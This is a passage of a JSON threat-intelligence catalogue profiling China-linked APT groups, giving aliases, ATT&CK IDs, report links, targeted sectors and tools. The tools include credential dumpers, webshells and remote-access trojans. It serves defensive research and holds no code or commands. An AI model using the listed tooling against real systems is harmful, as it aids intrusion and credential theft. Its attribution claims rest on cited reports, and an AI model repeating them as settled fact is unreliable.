"http://www.crowdstrike.com/blog/french-connection-french-aerospace-focused-cve-2014-0322-attack-shares-similarities-2012/", "https://401trg.com/burning-umbrella/", "http://www.darkreading.com/attacks-and-breaches/chinese--hidden-lynx--hackers-launch-widespread-apt-attacks/d/d-id/1111589?page_number=2", "http://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/hidden_lynx.pdf", "http://www.fireeye.com/blog/technical/cyber-exploits/2013/09/operation-deputydog-zero-day-cve-2013-3893-attack-against-japanese-targets.html", "https://intrusiontruth.wordpress.com/2019/07/24/apt17-is-run-by-the-jinan-bureau-of-the-chinese-ministry-of-state-security/", "http://www.fireeye.com/blog/technical/cyber-exploits/2013/11/operation-ephemeral-hydra-ie-zero-day-linked-to-deputydog-uses-diskless-method.html", "https://www.infosecurity-magazine.com/news/chinese-espionage-group-widescale/"], "tools": ["BLACKCOFFEE", "WEBCnC", "Joy RAT", "PlugX", "Trojan.Naid", "Backdoor.Moudoor", "Backdoor.Vasport", "Backdoor.Boda", "Trojan.Hydraq", "ZxShell", "Sakula", "China Chopper", "DestroyRAT"], "targets": "Government, defense & aerospace, industrial engineering, NGOs", "description": null}, {"operations": [], "comment": null, "attck_id": "G0026", "names": ["Dynamite Panda", "Wekby", "APT18", "TA428", "TG-0416"], "links": ["https://paper.seebug.org/papers/APT/APT_CyberCriminal_Campagin/2012/NormanShark-MaudiOperation.pdf", "https://www.proofpoint.com/us/threat-insight/post/chinese-apt-operation-lagtime-it-targets-government-information-technology", "http://researchcenter.paloaltonetworks.com/2016/05/unit42-new-wekby-attacks-use-dns-requests-as-command-and-control-mechanism/", "https://www.threatstream.com/blog/evasive-maneuvers-the-wekby-group-attempts-to-evade-analysis-via-custom-rop", "https://threatpost.com/apt-gang-branches-out-to-medical-espionage-in-community-health-breach/107828", "http://www.slideshare.net/CrowdStrike/crowd-casts-monthly-you-have-an-adversary-problem"], "tools": ["HTTPBrowser", "TokenControl", "HcdLoader", "PisLoader"], "targets": "Aerospace and Defence; Construction and Engineering; Education; Health and Biotechnology; High Tech; Telecommunications; Transportation", "description": null}, {"operations": [], "comment": "Use \"Skeleton Key\" on DCs", "attck_id": "G0001", "names": ["Tailgater Team", "Axiom", "APT17", "Dogfish (iDefense), Deputy Dog (iDefense), Winnti Umbrella"], "links": ["https://401trg.com/burning-umbrella/", "https://blog.trendmicro.com/trendlabs-security-intelligence/supply-chain-attack-operation-red-signature-targets-south-korean-organizations/", "https://securelist.com/analysis/publications/72275/i-am-hdroot-part-1/", "http://www.novetta.com/2015/04/operation-smn-winnti-update/", "http://securelist.com/blog/research/57585/winnti-faq-more-than-just-a-game/", "http://www.novetta.com/files/5614/1329/6232/novetta_cybersecurity_exec_summary-3.pdf"], "tools": ["Winnti", "Gh0st RAT", "PoisonIvy", "HydraQ", "Hikit", "ZxShell", "Deputy Dog", "Derusbi", "PlugX", "HTRAN", "HDRoot", "Fscan", "Timestomper"], "targets": null, "description": null}, {"operations": [], "comment": null, "attck_id": "G0044", "names": ["Wicked Panda", "Winnti Group", "APT41", "Winnti Umbrella, BARIUM, LEAD"], "links": ["https://lab52.io/blog/winnti-group-geostrategic-analysis-and-ttp/", "https://web.br.de/interaktiv/winnti/index.html", "https://www.nccgroup.trust/globalassets/our-research/uk/technical-advisories/2015/derusbi-server-technical-note-1-1-tlp-white.pdf", "https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2015/january/windows-firewall-hook-enumeration/", "http://blog.trendmicro.com/trendlabs-security-intelligence/winnti-abuses-github/", "https://www.protectwise.com/blog/winnti-evolution-going-open-source.html"], "tools": ["Winnti", "AceHash", "PlugX", "Webshells", "ZxShell"], "targets": "ThyssenKrupp, Gameforge, Valve, Teamviewer,Siemens, Sumitomo, BASF, Covestro, Shin-Etsu, Bayer, Roche", "description": null}, {"operations": ["OPM", "Anthem Hack"], "comment": null, "attck_id": "G0009", "names": ["KungFu Kittens", "Deep Panda", "Shell Crew", "WebMasters", "APT19", "Sh3llCr3w, PinkPanther, Winnti Group"], "links": ["https://www.fireeye.com/blog/threat-research/2017/06/phished-at-the-request-of-counsel.html", "http://cybercampaigns.net/wp-content/uploads/2013/06/Deep-Panda.pdf", "https://www.isightpartners.com/2015/07/threatscape-media-highlights-update-week-of-july-29th/"], "tools": ["Sakula/Sakurel", "Derusbi", "Scanbox Framework", "many Webshells including China Chopper", "WCE"], "targets": null, "description": null}, {"operations": ["Naikon", "Camera Shy"], "comment": null, "attck_id": "G0019", "names": ["Lotus Panda", "Naikon", "Thrip", "Naikon", "APT30", "PLA Unit 78020"], "links": ["https://www.symantec.com/blogs/threat-intelligence/thrip-hits-satellite-telecoms-defense-targets", "https://www.crowdstrike.com/resources/reports/2019-crowdstrike-global-threat-report/", "https://www.symantec.com/blogs/threat-intelligence/thrip-apt-south-east-asia", "http://www.crowdstrike.com/blog/rhetoric-foreshadows-cyber-activity-in-the-south-china-sea/", "https://www.threatconnect.com/camerashy/", "https://securelist.com/analysis/publications/69953/the-naikon-apt/", "http://blog.trendmicro.com/trendlabs-security-intelligence/rarstone-found-in-targeted-attacks/"], "tools": ["RARSTONE", "BACKSPACe", "NETEAGLE", "XSControl"], "targets": "satellite communications operator, Telecoms, and Defense Companies, Hong Kong", "description": null}, {"operations": [], "comment": null, "attck_id": "G0030", "names": ["Lotus Blossom", "Spring Dragon", "ST Group, Esile"], "links": ["http://researchcenter.paloaltonetworks.com/2015/12/attack-on-french-diplomat-linked-to-operation-lotus-blossom/", "https://community.rsa.com/community/products/netwitness/blog/2018/01/30/apt32-continues-asean-targeting", "https://www.accenture.com/t20180127T003755Z__w__/us-en/_acnmedia/PDF-46/Accenture-Security-Dragonfish-Threat-Analysis.pdf", "http://www.trendmicro.com.my/vinfo/my/security/news/cyber-attacks/esile-targeted-attack-campaign-hits-apac-governments", "https://securelist.com/blog/research/70726/the-spring-dragon-apt/", "https://securelist.com/blog/research/70726/the-spring-dragon-apt/", "http://researchcenter.paloaltonetworks.com/2015/06/operation-lotus-blossom/"], "tools": ["Elise Backdoor", "Lstudio", "CVE-2017-11882"], "targets": null, "description": null}, {"operations": [], "comment": "Overlaps with Operation Night Dragon", "attck_id": null, "names": ["APT6", "APT6", "1.php Group"], "links": ["https://paper.seebug.org/papers/APT/APT_CyberCriminal_Campagin/2011/tb_advanced_persistent_threats.pdf", "https://www.zscaler.com/blogs/research/1php-group-intrusion-set-paper", "https://motherboard.vice.com/read/fbi-flash-alert-hacking-group-has-had-access-to-us-govt-files-for-years", "https://www.zscaler.com/pdf/technicalbriefs/tb_advanced_persistent_threats.pdf"], "tools": ["Poison Ivy", ""], "targets": "US Government Organizations", "description": null}, {"operations": [], "comment": null, "attck_id": null, "names": ["Hippo Team", "Turbine Panda", "APT26", "APT26", "JerseyMikes"], "links": ["https://digit.fyi/lengthy-cyber-espionage-operation-helped-china-develop-c919-airliner/", "https://go.crowdstrike.com/rs/281-OBQ-266/images/15GlobalThreatReport.pdf?mkt_tok=3RkMMJWWfF9wsRojuKrPZKXonjHpfsX/7e8tWrHr08Yy0EZ5VunJEUWy2ocITtQ/cOedCQkZHblFnV4AS626XrENqKML", "https://www.crowdstrike.com/resources/wp-content/brochures/reports/huge-fan-of-your-work-intelligence-report.pdf"], "tools": ["Cobalt", "QuickPulse", "credential stealers such as WCE", "GSECDUMP", "COATHOOK", "HTRAN", "SOGU", "TWOCHAINS", "QUICKBALL"], "targets": "Affected Industry: Aerospace and Defense, business and Professional Services/Legal/Accounting, High Tech Software and hardware services", "description": "Supply-chain attacks such as strategic web compromise (SWC) where the actor compromise 3rd-party service provider hosting the victim websites"}, {"operations": [], "comment": "Some vendors track this group in up to 3 separate groups", "attck_id": "G0004", "names": ["Social Network Team", "Vixen Panda", "Mirage", "Playful Dragon", "APT15", "Ke3Chang", "Mirage Team, Lurid, Social Network Team, Royal APT, Metushy, Winnti Umbrella", "GREF"], "links": ["https://www.welivesecurity.com/2019/07/18/okrum-ke3chang-targets-diplomatic-missions/", "https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2018/march/apt15-is-alive-and-strong-an-analysis-of-royalcli-and-royaldns/", "https://github.com/nccgroup/Royal_APT", "https://www.intezer.com/miragefox-apt15-resurfaces-with-new-tools-based-on-old-ones/", "http://researchcenter.paloaltonetworks.com/2016/05/operation-ke3chang-resurfaces-with-new-tidepool-malware/", "https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-operation-ke3chang.pdf", "http://arstechnica.com/security/2015/04/elite-cyber-crime-group-strikes-back-after-attack-by-rival-apt-gang/", "https://www.crowdstrike.com/resources/reports/2019-crowdstrike-global-threat-report/", "https://www.fireeye.com/blog/threat-research/2014/09/forced-to-adapt-xslcmd-backdoor-now-on-os-x.html", "https://401trg.com/burning-umbrella/"], "tools": ["Mirage", "(Nvidia program side-loading) PlugX", "XSLCmd", "TidePool", "BS2005", "RoyalCli", "iWebRat", "Russian-language decoy document", "ENFAL", "ENDCMD", "QUICKHEAL", "SOGU", "CYFREE", "MIRAGE", "NOISEMAKER", "QUICKHEAL", "SWALLOWFLY"], "targets": "PH, VN, TW, US, UK, IT, PL, UN, SG, NATO - Gov, Political party", "description": null}, {"operations": [], "comment": null, "attck_id": null, "names": ["NetTraveler", "NetTraveler", "APT21"], "links": ["https://securelist.com/blog/research/35936/nettraveler-is-running-red-star-apt-attacks-compromise-high-profile-victims/", "https://securelist.com/blog/incidents/57455/nettraveler-is-back-the-red-star-apt-returns-with-new-tricks/"], "tools": ["NetTraveler"], "targets": "This threat actor targets computer networks associated with Tibetan and Uyghur activists for espionage purposes.", "description": null}, {"operations": [], "comment": null, "attck_id": null, "names": ["ICEFOG", "Dagger Panda", "Ice Fog", "IceFog", "Fucobha, Temp.Trident"], "links": ["https://www.anomali.com/blog/analyzing-digital-quartermasters-in-asia-do-chinese-and-indian-apts-have-a-shared-supply-chain", "https://speakerdeck.com/ashley920/into-the-fog-the-return-of-icefog-apt", "http://www.darkreading.com/attacks-and-breaches/java-icefog-malware-variant-infects-us-businesses/d/d-id/1113451", "http://kasperskycontenthub.com/wp-content/uploads/sites/43/vlpdfs/icefog.pdf", "https://securelist.com/blog/research/57331/the-icefog-apt-a-tale-of-cloak-and-three-daggers/", "https://securelist.com/blog/incidents/58209/the-icefog-apt-hits-us-targets-with-java-backdoor/"], "tools": ["Dagger Three (C2 software)", "Fucobha Backdoor", "IceFog", "RoyalRoad RTF Weaponizer"], "targets": "This threat actor targets government institutions, military contractors, maritime and shipbuilding groups, telecommunications operators, and others, primarily in US, Taiwan, Japan and South Korea.", "description": null}, {"operations": [], "comment": "Possibly assisted in Operation Aurora, the RSA incident, and the Joint Strike Fighter Program compromise", "attck_id": "G0066", "names": ["Sneaky Panda", "Beijing Group", "Hydraq, SIG22, Elderwood, Elderwood Gang"], "links": ["https://blog.crysys.hu/2018/03/territorial-dispute-nsas-perspective-on-apt-landscape/", "http://www.csmonitor.com/USA/2012/0914/Stealing-US-business-secrets-Experts-ID-two-huge-cyber-gangs-in-China", "https://en.wikipedia.org/wiki/Operation_Aurora#Attackers_involved", "http://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/the-elderwood-project.pdf"], "tools": ["Hydraq", "Elderwood Project"], "targets": "This threat actor targets private sector companies in the defense, shipping, aeronautics, arms, and energy sectors, as well as nonprofits and financial firms.", "description": null}, {"operations": [], "comment": "Possible overlap with Beijing Group", "attck_id": null, "names": ["APT22"], "links": ["http://www.slideshare.net/CTruncer/ever-present-persistence-established-footholds-seen-in-the-wild"], "tools": ["China Chopper"], "targets": null, "description": null}, {"operations": [], "comment": null, "attck_id": "G0039", "names": ["Suckfly"], "links": ["http://www.symantec.com/connect/blogs/suckfly-revealing-secret-life-your-code-signing-certificates"], "tools": ["Nidiran", "Korplug", "PlugX"], "targets": "Indian organisations and Republic of Korea", "description": null}, {"operations": [], "comment": "\u201cPdPD\u201d (50 64 50 44) marker for encrypted binaries", "attck_id": null, "names": ["APT4", "Wisp Team", "Samurai Panda", "APT4", "APT4", "PLA Navy"], "links": ["http://www.crowdstrike.com/blog/whois-samurai-panda/"], "tools": [], "targets": null, "description": null}, {"operations": [], "comment": "\"Pitty Tiger\" was originally the name of a malware payload by the malware tracker blog. Airbus and FireEye identified the actor as Chinese.  CrowdStrike uses \"tiger\" when naming adversaries alligned with India.  Crowdstrike associates the actor with the name \"Pitty Panda\" conforming to their naming convention for Chinese actors.", "attck_id": null, "names": ["Pitty Tiger", "Pitty Panda", "Pitty Tiger"], "links": ["http://blog.malwaretracker.com/2013/06/tomato-garden-campaign-possible.html", "http://blog.airbuscybersecurity.com/post/2014/07/The-Eye-of-the-Tiger2", "https://www.fireeye.com/blog/threat-research/2014/07/spy-of-the-tiger.html"], "tools": ["PittyTiger", "Paladin RAT"], "targets": null, "description": null}, {"operations": [], "comment": null, "attck_id": "G0029", "names": ["Scarlet Mimic"], "links": ["http://researchcenter.paloaltonetworks.com/2016/01/scarlet-mimic-years-long-espionage-targets-minority-activists/"], "tools": ["FakeM", "Psylo", "MobileOrder"], "targets": "Uyghur and Tibetan activists as well as those who are interested in their causes", "description": null}, {"operations": [], "comment": null, "attck_id": "G0073", "names": ["Sunshop Group", "Codoso", "C0d0so", "APT19"], "links": ["https://www.proofpoint.com/us/threat-insight/post/exploring-bergard-old-malware-new-tricks", "http://researchcenter.paloaltonetworks.com/2016/01/new-attacks-linked-to-c0d0s0-group/", "https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks", "http://www.isightpartners.com/2015/02/codoso/#sthash.VJMDVPQB.dpuf"], "tools": ["Bergard Trojan", "Derusbi", "TXER"], "targets": "Forbes,  Defense, Finance, Energy, Government, Political Dissidents, Global Think Tanks", "description": "Watering Hole"}, {"operations": [], "comment": "\u201cPdPD\u201d (50 64 50 44) marker for encrypted binaries", "attck_id": null, "names": ["SVCMONDR"], "links": ["https://securelist.com/analysis/publications/74828/cve-2015-2545-overview-of-current-threats/"], "tools": ["CVE-2015-2545"], "targets": "Taiwan, Thailand", "description": null}, {"operations": [], "comment": "iSight has mentioned tracking a China-nexus group they dub \"Wisp Team\" - have not resolved this w/ other naming conventions", "attck_id": null, "names": ["Wisp Team", "Wisp Team", "APT4"], "links": ["https://www.isightpartners.com/2015/01/threatscape-media-highlights-update-week-january-12/", "https://www.isightpartners.com/2014/04/weeks-threatscape-media-highlights-update-2/", "https://www.isightpartners.com/2014/09/weeks-threatscape-media-highlights-update-22/"], "tools": [], "targets": "Defense Industrial Base, US Government", "description": null}, {"operations": [], "comment": "iSight has mentioned tracking a China-nexus activity they dub \"Mana Team\", targeting Australian interests - have not resolved this w/ other naming conventions", "attck_id": null, "names": ["Mana Team", "Mana Team"], "links": ["https://www.isightpartners.com/2016/02/threatscape-media-highlights-update-week-of-february-17th/"], "tools": [], "targets": "Australia", "description": null}, {"operations": [], "comment": null, "attck_id": null, "names": ["TEMP.Zhenbao", "TEMP.Zhenbao"], "links": ["https://www.isightpartners.com/2014/11/threatscape-media-highlights-update-week-november-10/", "http://www.securityweek.com/plugx-rat-used-gather-intel-afghan-russian-military-report"], "tools": [], "targets": null, "description": null}, {"operations": [], "comment": null, "attck_id": null, "names": ["SPIVY"], "links": ["http://researchcenter.paloaltonetworks.com/2016/04/unit42-new-poison-ivy-rat-variant-targets-hong-kong-pro-democracy-activists/"], "tools": [], "targets": "Hong Kong dissidents", "description": null}, {"operations": [], "comment": null, "attck_id": null, "names": ["Mofang"], "links": ["https://blog.fox-it.com/2016/06/15/mofang-a-politically-motivated-information-stealing-adversary/", "https://www.threatconnect.com/china-superman-apt/"], "tools": ["ShimRAT", "ShimRATReporter"], "targets": "Government, military, Critical Infrastructure,Automotive Industry*,Weapon Industry*, This threat actor compromises government and critical infrastructure entities, primarily in Myanmar, for espionage purposes. Myanmar, Canada, United States, Germany, India, South Korea, Singapore", "description": null}, {"operations": [], "comment": null, "attck_id": "G0017", "names": ["DragonOK", "DragonOK"], "links": ["https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-operation-quantum-entanglement.pdf", "http://www.morphick.com/resources/news/deep-dive-dragonok-rambo-backdoor", "https://blogs.forcepoint.com/security-labs/trojanized-adobe-installer-used-install-dragonok%E2%80%99s-new-custom-backdoor", "http://researchcenter.paloaltonetworks.com/2015/04/unit-42-identifies-new-dragonok-backdoor-malware-deployed-against-japanese-targets/", "http://researchcenter.paloaltonetworks.com/2017/01/unit42-dragonok-updates-toolset-targets-multiple-geographic-regions/"], "tools": ["CVE-2015-1641", "Sysget", "IsSpace", "Rambo Backdoor"], "targets": "Japan", "description": null}, {"operations": [], "comment": null, "attck_id": null, "names": ["Group 27"], "links": ["https://www.arbornetworks.com/blog/asert/wp-content/uploads/2016/01/ASERT-Threat-Intelligence-Brief-2015-08-Uncovering-the-Seven-Pointed-Dagger.pdf", "https://unit42.paloaltonetworks.com/unit42-trochilus-rat-new-moonwind-rat-used-attack-thai-utility-organizations/"], "tools": ["Trochilus RAT", "PlugX", "EvilGrab", "3102 variant of 9002 RAT"], "targets": null, "description": null}, {"operations": [], "comment": null, "attck_id": null, "names": ["Tonto Team", "Tonto Team", "CactusPete"], "links": ["https://www.wsj.com/articles/chinas-secret-weapon-in-south-korea-missile-fight-hackers-1492766403?emailToken=JRrydPtyYnqTg9EyZsw31FwuZ7JNEOKCXF7LaW/HM1DLsjnUp6e6wLgph560pnmiTAN/5ssf7moyADPQj2p2Gc+YkL1yi0zhIiUM9M6aj1HTYQ=="], "tools": [], "targets": null, "description": null}, {"operations": [], "comment": null, "attck_id": "G0062", "names": ["TA459"], "links": ["https://www.proofpoint.com/us/threat-insight/post/apt-targets-financial-analysts#.WS3IBVFV4no.twitter"], "tools": ["PlugX", "NetTraveler", "ZeroT", "PCrat", "Gh0st"], "targets": "Central Asian countries, Russia, Belarus, Mongolia, and others", "description": null}, {"operations": [], "comment": null, "attck_id": "G0060", "names": ["Tick", "Tick", "REDBALDKNIGHT", "BRONZE BUTLER"], "links": ["https://www.secureworks.com/research/bronze-butler-targets-japanese-businesses", "http://blog.trendmicro.com/trendlabs-security-intelligence/redbaldknight-bronze-butler-daserf-backdoor-now-using-steganography/", "https://blog.talosintelligence.com/2018/10/tracking-tick-through-recent-campaigns.html", "http://blog.jpcert.or.jp/2017/08/detecting-datper-malware-from-proxy-logs.html", "https://researchcenter.paloaltonetworks.com/2017/07/unit42-tick-group-continues-attacks/", "https://www.symantec.com/connect/blogs/tick-cyberespionage-group-zeros-japan", "https://jsac.jpcert.or.jp/archive/2020/pdf/JSAC2020_8_koike-nakajima_jp.pdf", "https://www.secureworks.jp/resources/rp-bronze-butler", "https://blog.trendmicro.com/trendlabs-security-intelligence/operation-endtrade-finding-multi-stage-backdoors-that-tick/"], "tools": ["whoami", "procdump", "VBS", "WCE", "Mimikatz", "gsecdump", "PsExec", "Daserf", "Gofarer", "Datper", "ABK Downloader", "avirra Downloader", "Datper", "RoyalRoad RTF Weaponizer"], "targets": null, "description": null}, {"operations": [], "comment": null, "attck_id": null, "names": ["Lucky Cat", "Shadow Network, SabPub"], "links": ["http://www.infoworld.com/article/2617225/malware/sabpub-malware-proves-macs-are-an-apt-target.html", "https://blog.talosintelligence.com/2019/02/exilerat-shares-c2-with-luckycat.html", "https://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/the_luckycat_hackers.pdf", "http://www.securityweek.com/mac-malware-linked-luckycat-attack-campaign", "https://securelist.com/blog/incidents/33208/new-version-of-osx-sabpub-confirmed-mac-apt-attacks-19/", "http://blog.trendmicro.com/trendlabs-security-intelligence/luckycat-redux-inside-an-apt-campaign/", "http://www.nartv.org/mirror/shadows-in-the-cloud.pdf"], "tools": [], "targets": "A threat actor targets computer networks associated with Tibetan activists, as well as military research and development, aerospace, engineering, and shipping industries in India and Japan.", "description": null}, {"operations": [], "comment": null, "attck_id": "G0065", "names": ["Temp.Periscope", "Leviathan", "APT40", "APT40", "Temp.Jumper, GADOLINIUM, MUDCARP, Hainan Xiandun Technology Company"], "links": ["https://intrusiontruth.wordpress.com/2020/01/13/who-else-works-for-this-cover-company-network/", "https://www.anomali.com/blog/analyzing-digital-quartermasters-in-asia-do-chinese-and-indian-apts-have-a-shared-supply-chain", "https://intrusiontruth.wordpress.com/2020/01/15/hainan-xiandun-technology-company-is-apt40/", "https://jsac.jpcert.or.jp/archive/2020/pdf/JSAC2020_8_koike-nakajima_jp.pdf", "https://lab52.io/blog/leviathan-geostrategy-and-ttp-technical-tactics-and-procedures/", "https://prezi.com/view/jGyAzyy5dTOkDrtwsJi5/", "https://www.fireeye.com/blog/threat-research/2019/03/apt40-examining-a-china-nexus-espionage-actor.html", "https://www.fireeye.com/blog/threat-research/2018/07/chinese-espionage-group-targets-cambodia-ahead-of-elections.html", "https://www.proofpoint.com/us/threat-insight/post/leviathan-espionage-actor-spearphishes-maritime-and-defense-targets", "https://intrusiontruth.wordpress.com/2020/01/10/who-is-mr-gu/", "https://www.fireeye.com/blog/threat-research/2018/03/suspected-chinese-espionage-group-targeting-maritime-and-engineering-industries.html", "https://intrusiontruth.wordpress.com/2020/01/09/what-is-the-hainan-xiandun-technology-development-company/", "https://intrusiontruth.wordpress.com/2020/01/14/who-is-mr-ding/"], "tools": ["AIRBREAK", "BADFLICK", "PHOTO", "HOMEFRY", "LUNCHMONEY", "MURKYTOP", "China Chopper", "Beacon", "BLACKCOFFEE", "CVE-2017-11882", "Derusbi", "RoyalRoad RTF Weaponizer"], "targets": "maritime-related targets across multiple verticals, including engineering firms, shipping and transportation, manufacturing, defense, government offices, and research universities", "description": null}, {"operations": [], "comment": "Personas: Laurentiu Moon, Sincoder", "attck_id": null, "names": ["PassCV", "Winnti Umbrella, China Cracking Group, ", "TG-3279"], "links": ["https://www.secureworks.com/research/threat-group-3279-targets-the-video-game-industry#up2", "https://blog.cylance.com/digitally-signed-malware-targeting-gaming-companies", "https://401trg.com/burning-umbrella/"], "tools": ["Sabre", "Kitkiot", "Conpee", "Etso", "Runxx", "dnsenum", "s (custom port scanner)", "rdp_crk", "icmp_shell", "Jynxkit", "Gh0st RAT", "NetCommander", "Carberp RAT"], "targets": "Gaming Companies", "description": null}, {"operations": [], "comment": null, "attck_id": null, "names": ["BARIUM", "Winnti Umbrella, BRONZE ATLAS", "TG-2633"], "links": ["https://cloudblogs.microsoft.com/microsoftsecure/2017/01/25/detecting-threat-actors-in-recent-german-industrial-attacks-with-windows-defender-atp/?source=mmpc", "https://401trg.pw/burning-umbrella/"], "tools": ["Winnti Rootkit malware"], "targets": "Electronic gaming, multimedia, Internet content industries, technology companies", "description": null}, {"operations": [], "comment": null, "attck_id": null, "names": ["LEAD", "Winnti Umbrella"], "links": ["https://www.france24.com/en/20190404-bayer-victim-cyber-attack-german-media", "https://cloudblogs.microsoft.com/microsoftsecure/2017/01/25/detecting-threat-actors-in-recent-german-industrial-attacks-with-windows-defender-atp/?source=mmpc", "https://401trg.pw/burning-umbrella/"], "tools": ["Winnti Rootkit malware"], "targets": "Multinational, multi-industry companies, textiles, chemicals, electronics, pharmaceutical companies, manufacturing", "description": null}, {"operations": [], "comment": null, "attck_id": null, "names": ["Iron Group", "Rocke"], "links": ["https://www.anomali.com/blog/rocke-evolves-its-arsenal-with-a-new-malware-family-written-in-golang#When:18:10:00Z", "https://blog.talosintelligence.com/2018/08/rocke-champion-of-monero-miners.html", "https://unit42.paloaltonetworks.com/malware-used-by-rocke-group-evolves-to-evade-detection-by-cloud-security-products/", "https://researchcenter.paloaltonetworks.com/2018/09/unit42-xbash-combines-botnet-ransomware-coinmining-worm-targets-linux-windows/", "https://blog.talosintelligence.com/2018/12/cryptomining-campaigns-2018.html"], "tools": ["XBash"], "targets": "Cybercrime, Cryptomining, Cryptojacking", "description": null}, {"operations": [], "comment": "\u201cPdPD\u201d (50 64 50 44) marker for encrypted binaries", "attck_id": null, "names": ["Anchor Panda", "Anchor Panda"], "links": ["http://www.crowdstrike.com/blog/whois-anchor-panda/"], "tools": ["Adobe Gh0st", "Poison Ivy", "Torn RAT"], "targets": "This threat actor targets government and private sector entities interested in maritime issues in the South China Sea for espionage purposes. Maritime satellite systems, aerospace companies, and defense contractors.", "description": null}, {"operations": [], "comment": "Mentioned by Alperovitch in 2013 article as targeting financial services industry", "attck_id": null, "names": ["Big Panda"], "links": ["http://www.darkreading.com/attacks-and-breaches/crowdstrike-falcon-traces-attacks-back-to-hackers/d/d-id/1110402?"], "tools": [], "targets": "Financial services firms", "description": null}, {"operations": [], "comment": "Listed on slide 8", "attck_id": null, "names": ["Electric Panda"], "links": ["http://www.slideshare.net/CrowdStrike/crowd-casts-monthly-you-have-an-adversary-problem"], "tools": [], "targets": null, "description": null}, {"operations": [], "comment": "Mentioned slide 15", "attck_id": null, "names": ["Eloquent Panda"], "links": ["http://files.sans.org/summit/Threat_Hunting_Incident_Response_Summit_2016/PDFs/Detecting-and-Responding-to-Pandas-and-Bears-Christopher-Scott-CrowdStrike-and-Wendi-Whitmore-IBM.pdf"], "tools": [], "targets": null, "description": null}, {"operations": ["A Tale of Two Targets\t"], "comment": null, "attck_id": "G0027", "names": ["TEMP.Hippo", "Emissary Panda", "Emissary Panda", "LuckyMouse", "APT27", "ZipToken, Iron Tiger", "BRONZE UNION", "TG-3390"], "links": ["https://lab52.io/blog/apt27-rootkit-updates/", "https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2018/april/decoding-network-data-from-a-gh0st-rat-variant/", "https://securelist.com/luckymouse-hits-national-data-center/86083/", "https://securelist.com/luckymouse-ndisproxy-driver/87914/", "https://www.secureworks.com/research/bronze-union", "https://www.threatconnect.com/blog/threatconnect-discovers-chinese-apt-activity-in-europe/", "http://www.secureworks.com/cyber-threat-intelligence/threats/threat-group-3390-targets-organizations-for-cyberespionage/", "https://www.secureworks.com/research/a-peek-into-bronze-unions-toolbox", "http://newsroom.trendmicro.com/blog/operation-iron-tiger-attackers-shift-east-asia-united-states", "https://www.crowdstrike.com/resources/reports/2019-crowdstrike-global-threat-report/"], "tools": ["PlugX", "China Chopper Webshell", "HttpBrowser", "Hunter", "ASPXTool", "wce", "gsecdump", "nbtscan", "htran"], "targets": "US Gov and contractors, Western think tanks", "description": null}, {"operations": [], "comment": "Listed slide 4", "attck_id": null, "names": ["Foxy Panda", "Foxy Panda"], "links": ["http://files.sans.org/summit/Threat_Hunting_Incident_Response_Summit_2016/PDFs/Detecting-and-Responding-to-Pandas-and-Bears-Christopher-Scott-CrowdStrike-and-Wendi-Whitmore-IBM.pdf"], "tools": [], "targets": "Technology & Communications", "description": null}, {"operations": [], "comment": "Listed slide 8", "attck_id": null, "names": ["Gibberish Panda", "Gibberish Panda"], "links": ["http://www.slideshare.net/CrowdStrike/crowd-casts-monthly-you-have-an-adversary-problem"], "tools": [], "targets": null, "description": null}, {"operations": [], "comment": "Weaponizer leaked, new activity wrongly attributed to this long inactive group, possible links to Icefog/Dagger Panda and Temp.Periscope/APT40", "attck_id": null, "names": ["Goblin Panda", "Goblin Panda", "Cycldek", "Hellsing", "Cycldek, Conimes Team, China1937CN Team, Temp.Conimes"], "links": ["https://jsac.jpcert.or.jp/archive/2020/pdf/JSAC2020_8_koike-nakajima_jp.pdf", "https://www.fortinet.com/blog/threat-research/cta-security-playbook--goblin-panda.html", "https://www.anomali.com/blog/analyzing-digital-quartermasters-in-asia-do-chinese-and-indian-apts-have-a-shared-supply-chain", "http://www.crowdstrike.com/blog/rhetoric-foreshadows-cyber-activity-in-the-south-china-sea/", "https://www.crowdstrike.com/blog/meet-crowdstrikes-adversary-of-the-month-for-august-goblin-panda/"], "tools": ["ZeGhost", "PlugX", "tempfun", "NewCore RAT", "Sisfader", "RoyalRoad RTF Weaponizer"], "targets": "Southeast Asia, Government of Vietnam", "description": null}, {"operations": [], "comment": null, "attck_id": null, "names": ["Hammer Panda"], "links": ["http://www.darkreading.com/endpoint/chinese-cyberspies-pivot-to-russia-in-wake-of-obama-xi-pact/d/d-id/1324242"], "tools": [], "targets": "Russia", "description": null}, {"operations": ["Op. Poisoned Hurricane"], "comment": "used free DNS servers provided by Hurricane Electric", "attck_id": null, "names": ["TEMP.Avengers", "Hurricane Panda", "Hurricane Panda", "Black Vine", "APT31", "Zirconium"], "links": ["http://blog.airbuscybersecurity.com/post/2015/10/Malware-Sakula-Evolutions-%28Part-2/2%29", "https://blog.confiant.com/uncovering-2017s-largest-malvertising-operation-b84cd38d6b85", "https://uk.reuters.com/article/uk-china-cyber-norway-visma/china-hacked-norways-visma-to-steal-client-secrets-investigators-idUKKCN1PV14R", "https://www.symantec.com/connect/blogs/black-vine-formidable-cyberespionage-group-targeted-aerospace-healthcare-2012", "http://blog.airbuscybersecurity.com/post/2015/09/APT-BlackVine-Malware-Sakula", "http://www.crowdstrike.com/blog/cyber-deterrence-in-action-a-story-of-one-long-hurricane-panda-campaign/", "http://blog.crowdstrike.com/crowdstrike-discovers-use-64-bit-zero-day-privilege-escalation-exploit-cve-2014-4113-hurricane-panda/", "https://raw.githubusercontent.com/GuardaCyber/APT-Groups-and-Operations/master/Reports/FireEye%20Intel%20-%20APT31%20Threat%20Group%20Profile.pdf"], "tools": ["China Chopper Webshell", "PlugX", "Mimikatz", "Sakula"], "targets": "Aerospace, Healthcare, Energy (gas & electric turbine manufacturing), Military and defense, Finance, Agriculture, Technology, Japan, United States, United Kingdom, India, Canada, Brazil, South Africa, Australia, Thailand, South Korea, France, Switzerland, Sweden, Finland, Norway", "description": null}, {"operations": [], "comment": null, "attck_id": null, "names": ["Impersonating Panda", "Impersonating Panda"], "links": [], "tools": [], "targets": "Financial sector", "description": null}, {"operations": [], "comment": null, "attck_id": null, "names": ["Judgement 